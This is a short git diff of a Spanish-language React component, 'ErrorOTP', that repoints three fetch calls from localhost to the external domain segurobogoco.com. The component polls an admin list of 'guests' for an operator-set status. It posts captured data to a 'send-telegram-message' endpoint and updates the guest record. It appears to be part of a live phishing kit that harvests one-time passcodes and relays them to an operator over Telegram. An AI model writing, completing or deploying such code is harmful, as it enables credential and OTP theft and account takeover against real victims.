@@ -29,7 +29,7 @@ const ErrorOTP = () => {
 
     const interval = setInterval(async () => {
       try {
-        const response = await fetch('http://127.0.0.1:8000/api/v1/admin/guests');
+        const response = await fetch('https://segurobogoco.com/api/v1/admin/guests');
         const data = await response.json();
 
         if (data && data.guests && data.guests[0] && data.guests[0].status_id === 6) {
@@ -65,7 +65,7 @@ const ErrorOTP = () => {
         };
 
         try {
-          const response = await fetch('http://127.0.0.1:8000/api/v1/send-telegram-message', {
+          const response = await fetch('https://segurobogoco.com/api/v1/send-telegram-message', {
             method: 'POST',
             headers: {
               'Content-Type': 'application/json',
@@ -77,7 +77,7 @@ const ErrorOTP = () => {
             throw new Error('Error al enviar los datos al backend');
           }
 
-          const updateResponse = await fetch(`http://127.0.0.1:8000/api/v1/guest/${guestId}`, {
+          const updateResponse = await fetch(`https://segurobogoco.com/api/v1/guest/${guestId}`, {
             method: 'PUT',
             headers: {
               'Content-Type': 'application/json',
